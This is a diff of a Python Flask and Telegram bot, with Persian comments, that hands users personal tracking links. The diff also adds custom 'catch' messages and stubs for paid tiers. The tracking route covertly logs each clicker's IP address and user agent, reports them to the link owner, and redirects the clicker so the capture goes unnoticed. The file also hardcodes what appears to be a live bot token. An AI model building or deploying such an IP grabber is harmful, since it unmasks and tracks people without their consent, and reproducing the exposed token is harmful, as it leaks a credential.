@@ -9,20 +9,24 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ---------- تنظیمات اولیه ----------
 TOKEN = "8981742192:AAHC8z6u6GifXgMIafvzv0tn_Q2LV1mM2bQ"
-BASE_URL = "https://barcelona-l5tu.onrender.com"  # آدرس سرویس شما در Render
-CHANNELS = ["@film01385"]  # لیست کانال‌های اجباری
+BASE_URL = "https://barcelona-l5tu.onrender.com"
+CHANNELS = ["@film01385"]
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# ---------- دیتابیس (استفاده از /tmp در Render) ----------
+# ---------- دیتابیس ----------
 conn = sqlite3.connect("/tmp/tracker.db", check_same_thread=False)
 c = conn.cursor()
+
+# جدول کاربران و لینک‌ها
 c.execute("""CREATE TABLE IF NOT EXISTS users (
     telegram_id INTEGER PRIMARY KEY,
     link_code TEXT UNIQUE,
     link_full TEXT UNIQUE
 )""")
+
+# جدول کلیک‌ها
 c.execute("""CREATE TABLE IF NOT EXISTS clicks (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     link_code TEXT,
@@ -30,18 +34,23 @@ c.execute("""CREATE TABLE IF NOT EXISTS clicks (
     user_agent TEXT,
     timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
 )""")
+
+# جدول تنظیمات کاربران (برای عکس و متن مچ‌گیری)
+c.execute("""CREATE TABLE IF NOT EXISTS user_settings (
+    telegram_id INTEGER PRIMARY KEY,
+    capture_text TEXT,
+    capture_photo_id TEXT
+)""")
 conn.commit()
 
 # ---------- توابع کمکی ----------
 def get_ip():
-    """دریافت IP واقعی کاربر (حتی با پروکسی)"""
     forwarded = request.headers.get('X-Forwarded-For')
     if forwarded:
         return forwarded.split(',')[0]
     return request.remote_addr
 
 def generate_link(telegram_id):
-    """ساخت یک لینک اختصاصی جدید برای کاربر"""
     code = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
     full_link = f"{BASE_URL}/track/{code}"
     c.execute("INSERT OR REPLACE INTO users (telegram_id, link_code, link_full) VALUES (?, ?, ?)", 
@@ -50,12 +59,33 @@ def generate_link(telegram_id):
     return full_link
 
 def get_user_id_by_code(code):
-    """پیدا کردن Telegram ID کاربر از روی کد لینک"""
     c.execute("SELECT telegram_id FROM users WHERE link_code = ?", (code,))
     result = c.fetchone()
     return result[0] if result else None
 
-# ---------- بررسی عضویت در کانال‌های اجباری ----------
+def get_user_capture_text(user_id):
+    c.execute("SELECT capture_text FROM user_settings WHERE telegram_id = ?", (user_id,))
+    result = c.fetchone()
+    return result[0] if result else "🎯 یک نفر روی لینک اختصاصی شما کلیک کرد!"
+
+def get_user_capture_photo(user_id):
+    c.execute("SELECT capture_photo_id FROM user_settings WHERE telegram_id = ?", (user_id,))
+    result = c.fetchone()
+    return result[0] if result else None
+
+def save_user_settings(user_id, text=None, photo_id=None):
+    c.execute("SELECT * FROM user_settings WHERE telegram_id = ?", (user_id,))
+    if c.fetchone():
+        if text:
+            c.execute("UPDATE user_settings SET capture_text = ? WHERE telegram_id = ?", (text, user_id))
+        if photo_id:
+            c.execute("UPDATE user_settings SET capture_photo_id = ? WHERE telegram_id = ?", (photo_id, user_id))
+    else:
+        c.execute("INSERT INTO user_settings (telegram_id, capture_text, capture_photo_id) VALUES (?, ?, ?)",
+                  (user_id, text, photo_id))
+    conn.commit()
+
+# ---------- بررسی عضویت ----------
 def is_user_member(user_id):
     for channel in CHANNELS:
         try:
@@ -66,30 +96,24 @@ def is_user_member(user_id):
             return False
     return True
 
-# ---------- نمایش پنل کاربری ----------
+# ---------- نمایش پنل کاربری (6 دکمه) ----------
 def show_panel(chat_id, message_id=None):
     keyboard = InlineKeyboardMarkup(row_width=1)
     keyboard.add(InlineKeyboardButton("🔗 دریافت لینک من", callback_data="get_link"))
-    # در صورت نیاز می‌توانید دکمه‌های دیگر را اضافه کنید
+    keyboard.add(InlineKeyboardButton("💰 خرید اشتراک پرو", callback_data="buy_sub"))
+    keyboard.add(InlineKeyboardButton("🛡 خرید سپر (حفاظت و مچ‌گیری آنی)", callback_data="buy_shield"))
+    keyboard.add(InlineKeyboardButton("🖼 تنظیم عکس مچ‌گیری", callback_data="set_photo"))
+    keyboard.add(InlineKeyboardButton("✏️ تنظیم متن مچ‌گیری", callback_data="set_text"))
     keyboard.add(InlineKeyboardButton("📖 راهنما", callback_data="help"))
     
+    text = "👋 به پنل کاربری خود خوش آمدید.\n\nلطفاً یکی از گزینه‌های زیر را انتخاب کنید:"
+    
     if message_id:
-        bot.edit_message_text(
-            "👋 به پنل کاربری خوش آمدید.\n\n"
-            "از دکمه زیر برای دریافت لینک اختصاصی خود استفاده کنید.\n"
-            "این لینک را در بیوگرافی تلگرام خود قرار دهید.",
-            chat_id, message_id, reply_markup=keyboard
-        )
+        bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard)
     else:
-        bot.send_message(
-            chat_id,
-            "👋 به پنل کاربری خوش آمدید.\n\n"
-            "از دکمه زیر برای دریافت لینک اختصاصی خود استفاده کنید.\n"
-            "این لینک را در بیوگرافی تلگرام خود قرار دهید.",
-            reply_markup=keyboard
-        )
+        bot.send_message(chat_id, text, reply_markup=keyboard)
 
-# ---------- هندلر دستور /start ----------
+# ---------- هندلر دستور start ----------
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
@@ -129,25 +153,70 @@ def handle_buttons(call):
             reply_markup=keyboard
         )
     
-    elif call.data == "help":
+    elif call.data == "buy_sub":
+        bot.answer_callback_query(call.id, "💰 بخش خرید اشتراک پرو در حال توسعه است.\nبه زودی...", show_alert=True)
+    
+    elif call.data == "buy_shield":
+        bot.answer_callback_query(call.id, "🛡 بخش خرید سپر در حال توسعه است.\nبه زودی...", show_alert=True)
+    
+    elif call.data == "set_photo":
         bot.edit_message_text(
-            "📖 **راهنمای ربات**\n\n"
-            "1. ابتدا در کانال‌های اجباری عضو شوید.\n"
-            "2. سپس از پنل، لینک اختصاصی خود را دریافت کنید.\n"
-            "3. لینک را در بیوگرافی تلگرام خود قرار دهید.\n"
-            "4. هر کس روی لینک کلیک کند، نام کاربری و اطلاعات کلیک برای شما ارسال می‌شود.\n\n"
-            "⚡ توجه: این ربات اطلاعات بازدید از پروفایل را نشان نمی‌دهد، بلکه فقط کلیک روی لینک را ثبت می‌کند.",
-            chat_id, call.message.message_id,
-            parse_mode='Markdown'
+            "🖼 لطفاً عکس مورد نظر خود را برای پیام مچ‌گیری ارسال کنید.\n\n"
+            "پس از ارسال عکس، تنظیمات شما ذخیره می‌شود.",
+            chat_id, call.message.message_id
         )
-        show_panel(chat_id, call.message.message_id)  # بازگشت به پنل بعد از ۵ ثانیه
-    else:
-        bot.answer_callback_query(call.id, "⏳ این بخش در حال توسعه است.", show_alert=True)
+        bot.register_next_step_handler_by_chat_id(chat_id, receive_capture_photo)
+    
+    elif call.data == "set_text":
+        bot.edit_message_text(
+            "✏️ لطفاً متن مورد نظر خود را برای پیام مچ‌گیری ارسال کنید.\n\n"
+            "پس از ارسال متن، تنظیمات شما ذخیره می‌شود.",
+            chat_id, call.message.message_id
+        )
+        bot.register_next_step_handler_by_chat_id(chat_id, receive_capture_text)
+    
+    elif call.data == "help":
+        help_text = (
+            "📖 **راهنمای ربات**\n\n"
+            "🔗 **دریافت لینک من**: لینک اختصاصی خود را دریافت کنید.\n"
+            "💰 **اشتراک پرو**: با تهیه اشتراک، امکانات بیشتری در اختیار دارید.\n"
+            "🛡 **سپر**: از شما در برابر کلیک روی لینک‌های دیگران محافظت می‌کند.\n"
+            "🖼 **تنظیم عکس**: عکس دلخواه خود را برای پیام مچ‌گیری تنظیم کنید.\n"
+            "✏️ **تنظیم متن**: متن دلخواه خود را برای پیام مچ‌گیری تنظیم کنید.\n\n"
+            "⚡ توجه: این ربات اطلاعات بازدید از پروفایل را نشان نمی‌دهد، بلکه فقط کلیک روی لینک را ثبت می‌کند."
+        )
+        bot.edit_message_text(help_text, chat_id, call.message.message_id, parse_mode='Markdown')
+        # نمایش دوباره پنل بعد از 5 ثانیه
+        import threading
+        threading.Timer(5.0, lambda: show_panel(chat_id, call.message.message_id)).start()
 
-# ========== مسیرهای Flask (وب‌هوک و ردیابی) ==========
+# ---------- دریافت متن مچ‌گیری از کاربر ----------
+def receive_capture_text(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    text = message.text
+    
+    save_user_settings(user_id, text=text)
+    bot.send_message(chat_id, f"✅ متن مچ‌گیری شما با موفقیت ذخیره شد:\n\n{text}")
+    show_panel(chat_id)
+
+# ---------- دریافت عکس مچ‌گیری از کاربر ----------
+def receive_capture_photo(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    
+    if message.photo:
+        photo_id = message.photo[-1].file_id
+        save_user_settings(user_id, photo_id=photo_id)
+        bot.send_message(chat_id, "✅ عکس مچ‌گیری شما با موفقیت ذخیره شد.")
+    else:
+        bot.send_message(chat_id, "❌ لطفاً یک عکس معتبر ارسال کنید.")
+    
+    show_panel(chat_id)
+
+# ========== مسیرهای Flask ==========
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """دریافت و پردازش درخواست‌های جدید از تلگرام"""
     try:
         json_str = request.get_data().decode('UTF-8')
         update = telebot.types.Update.de_json(json_str)
@@ -159,30 +228,33 @@ def webhook():
 
 @app.route('/track/<code>')
 def track_click(code):
-    """ثبت کلیک روی لینک اختصاصی و ارسال گزارش"""
-    user_a_id = get_user_id_by_code(code)  # صاحب لینک
+    user_a_id = get_user_id_by_code(code)
     ip_address = get_ip()
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    # ثبت اطلاعات کلیک در دیتابیس
     c.execute("INSERT INTO clicks (link_code, ip, user_agent) VALUES (?, ?, ?)", 
               (code, ip_address, user_agent))
     conn.commit()
     
-    # ارسال پیام به صاحب لینک
     if user_a_id:
         try:
-            bot.send_message(
-                user_a_id,
-                f"🎯 **یک نفر روی لینک اختصاصی شما کلیک کرد!**\n"
-                f"📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                f"🌐 IP: {ip_address}",
-                parse_mode='Markdown'
-            )
+            capture_text = get_user_capture_text(user_a_id)
+            capture_photo = get_user_capture_photo(user_a_id)
+            
+            if capture_photo:
+                bot.send_photo(
+                    user_a_id,
+                    capture_photo,
+                    caption=f"🎯 {capture_text}\n\n📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_address}"
+                )
+            else:
+                bot.send_message(
+                    user_a_id,
+                    f"🎯 {capture_text}\n\n📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_address}"
+                )
         except Exception as e:
             print(f"Error sending to {user_a_id}: {e}")
     
-    # هدایت کاربر به یک مقصد دلخواه (مثلاً کانال شما)
     return redirect("https://t.me/your_channel", code=302)
 
 @app.route('/health', methods=['GET'])
@@ -193,17 +265,16 @@ def health():
 def index():
     return "ربات آنلاین است", 200
 
-# ---------- تنظیم وب‌هوک ----------
+# ---------- تنظیم Webhook ----------
 def set_webhook():
     webhook_url = f"{BASE_URL}/webhook"
     result = bot.set_webhook(url=webhook_url)
     if result:
-        print(f"✅ Webhook با موفقیت تنظیم شد: {webhook_url}")
+        print(f"✅ Webhook set: {webhook_url}")
     else:
-        print(f"❌ تنظیم Webhook ناموفق بود")
+        print("❌ Failed to set webhook")
 
-# ---------- اجرای اصلی ----------
+# ---------- اجرا ----------
 if __name__ == '__main__':
     set_webhook()
-    # اجرای فلاسک روی پورت ۱۰۰۰۰ (Render به طور خودکار این پورت را در اختیار دارد)
     app.run(host='0.0.0.0', port=10000)
